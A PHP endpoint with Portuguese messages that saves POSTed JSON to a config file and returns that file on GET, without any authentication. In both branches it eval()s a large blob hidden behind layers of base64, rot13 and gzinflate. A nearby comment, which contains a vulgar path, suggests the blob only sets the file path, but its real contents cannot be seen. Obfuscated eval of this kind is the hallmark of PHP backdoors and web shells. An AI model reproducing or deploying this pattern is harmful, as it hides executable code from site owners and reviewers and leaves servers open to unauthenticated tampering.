<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $inputData = file_get_contents("php://input");
    $data = json_decode($inputData, true);

    if ($data) {

        eval(str_rot13(gzinflate(str_rot13(base64_decode('LUnXDq06Dv2ao3vmjV40QvS26Z2XEb1qNu3rYrY0KArEQeKV5dhzeKfn7zGe6f5Z9fZqnqqNwP63YVi2YX/LqXjK5/+DfzRSUe2WyZy0TNBCEqlXd24nJZdz9wdko2TxZH2o/yAmJ5UTT0L2sTjfSuhQDt2nOUNPjtzb5Hxb7iS39tO/mI7H8wxJuIQFOqvVoA15cn7dNlmIPAafgt2+1jC7jaYcR5ZXAydHhZOqkp5OKmkEHebeIpg3ztL3e6eLvfA9V39dIgJP6SxNujPB1jWOBGq+X6dTugsYB6YAN2XJ5KWpIMqd9wgQmgKyNM5GGEFkSAH7Xmxpzf6trapY3DoLEZXXDXPG2BCfxXNpyTU3qvVvJ8SDpvC9tbmTzqWbaK/LjtG12wqOygnRaqVUm63lvc5wWHnpZw2jLObFEBYDQG0j3IYZMEKqQlL5KyRDe2GRpLA4r1MdkH9oCdDeieY4uTG0zxCiuaQxCAcWhwOzUOQ3NbB2JHdvf0SF9YN6YG/iLT0nzm19P0ypediWlyOgokMyEsrwSd3UdZfKWAzXQ4lYWyQ2fZQd9Qe6Gj4b1UAFYEkAJooMXrVJ6H8QCcYvM2xAdMUndnr7HBs+h/W1C6rN9UN8yyHZfbnrpSumFlSCKUmdLPTWOZtZPFS+n9DH6oE/WXtVQ7YpqJZFUI/NX4tppOADlQTMxC3ataTPhDkw+LRPCl5LJHO8U60kujGaEFWG/61iXriRoJqJTI0wWddvK3c6gxZoIrJH1lOTQPRJ+SJYOJN2G9hnP/DcM0pZhqjjxi5s30tyBm7d0vn288OSl84iMzQkz2PC0Yy6nimKqOZEbwDsUl6zepFkse95VmbeNthTPCxJaKfymqDt9M2Z4BntACrx07qfQ53riw1Kn6CF6yLW6hlzXGLV95kHxHDZRipnYJXqtctYVwlTZzgiCM7RhHQocwtBV35g/CE37RXK0TXfq4bcz1xyR50+UynpI8+7EzMJvozihssN9WYcTF60leUa+Fdl+6SUoC7BrrseWOBvIN3Pg3tTCpNaKtiT78MmhZXqXkTm7j1eufMJYj4MFbYcrwJnKpQ5+qTrl1HVwbqGPVzh7YFoeamOXczodxQ+CkJlcR23XFqDsz7YHyFIye3V6xfFkYEffCWZn3CIAp1vNKZcO/R+RBCBJp5t4PxhL6hXGL4lrrSfGHfohd0EbfetC2ELFjYmZ6F1lSwdTGbrDo60n41NqZVfUdAHrTZMEnxVFGlhBdfmSSostXWeXuyToumvJcJzsnUrv+d4Rc8/7OBpPrIMJQkQrD+Q3lpRKgKhd/wI4nFOUb09bq+31s4PSRGbEm0SVesVH3AzCQxh39EYYdwjbBXvial501ouAkCsOeBB3j7pSoVyOc7lemhBnMzOumgb2TylmiW++jF+QhnGv/6JD0K6RbaI4t6+xQzr8lGURx6VNbfJTy+8u/NJpRQzD7odKPV6b8x0NBs1JRPEEh/fkaCMOjPK+QLTYk3g0DXy0zPcE2enEJDNdUp4O1a3kh8EOQ34Mju+w/fUqJbiAZlKnSaDksxvN76iMiW0A+XZhGyaKWXF1ioT2rRZD0tJy6rXu5MZEkE9rFvzKugBR+3+kNr78pq51rvuapuJegsxuo2YfPp8iuOU8urRmPOlugOnPlG0BzeBppGP3Vbond7yy3YhHpj09u1SEH+ueee2w+D7q/mzJf58wzN9iMtT+jI1aPAIXQGZRlAVVAzzVD3U1iBLAVOWvc0veBdv3K6OpSggwgwWjb2q4izG91OzWpE345PWOic4pvwjJydgRLiHYSBylngZuGoKvrRNtsoieUjE8Zf2JjfZ7A4/jV8VOtBzNWR1u4zmTjtH4d+AlvBNYTeUG+BUKTqhsCo6Ggblxnm2F1+ysEU6xJhRXCCrYoLqMy+5w/J4q93TXmmyUI6LodYEpUbEJRB+qPz8FjHSqrG/vDsXCMjh/PzxLYGUyI9f230YbwivpFoSu8z9iwE91IeuVOD5Q034h9rzlN1ofeD096tNTefTtIQw2AxnaBFoZsFiNgmO5IoR0eHhO9sTcOd3orIr/kPGZPcxFHzAeZK1UC+C2Yq/pe2O89mB6UMiKelKeuEXZ6DdanP/Jkrl3uDd1HMvQUp1xkEsi6RHdQ8pPs5SbwhNxxXontO/QMEofwoq0cPu6Y7xYsvgWEOZuucOe9l0tGOoImdV45S6DlMqyDGAUsYcuzgLYJeDdXBqPWFDa8AFcObCNhKkESF0HSZuH73UUeFbfU/R759xi+q1COQ9cTjMSM/vzFI4ps1NMDMxSq5V0PLOCojAXIsz70YU9l/NmSimVunR/t03osFX8no+vhhq65CIaMiPSNKRBwPbM5tX4FEudXrJzb8SjrvdH9QG7Z//gOe//wI=')))));
       // $configFile = './sexo/selvagem/eugosto/de/comer/cu/aii/delicia/config.json';


        if (file_put_contents($configFile, json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE))) {
            echo json_encode(["message" => "Configuração salva com sucesso!"]);
        } else {
            http_response_code(500);
            echo json_encode(["error" => "Erro ao salvar o arquivo de configuração."]);
        }
    } else {
        http_response_code(400);
        echo json_encode(["error" => "Dados inválidos enviados."]);
    }
} else if ($_SERVER['REQUEST_METHOD'] === 'GET') {

eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
    //$configFile = './sexo/selvagem/eugosto/de/comer/cu/aii/delicia/config.json';

    if (file_exists($configFile)) {
        $configData = file_get_contents($configFile);
        echo $configData;
    } else {
        http_response_code(404);
        echo json_encode(["error" => "Arquivo de configuração não encontrado."]);
    }
} else {
    http_response_code(405);
    echo json_encode(["error" => "Método não permitido."]);
}
?>
